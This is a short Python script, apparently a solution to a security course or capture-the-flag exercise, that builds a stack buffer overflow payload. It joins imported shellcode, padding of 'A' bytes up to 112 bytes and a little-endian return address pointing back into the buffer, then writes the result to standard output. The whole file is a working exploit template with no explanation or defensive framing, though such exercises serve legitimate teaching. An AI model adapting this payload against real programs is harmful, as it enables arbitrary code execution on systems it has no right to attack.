import sys
import struct
from shellcode import shellcode

def write():
    buf_start = 0xfff6e4ec  
    padding = b'A' * (112 - len(shellcode))  
    ret = struct.pack("<I", buf_start)      
    payload = shellcode + padding + ret      
    sys.stdout.buffer.write(payload)

write()
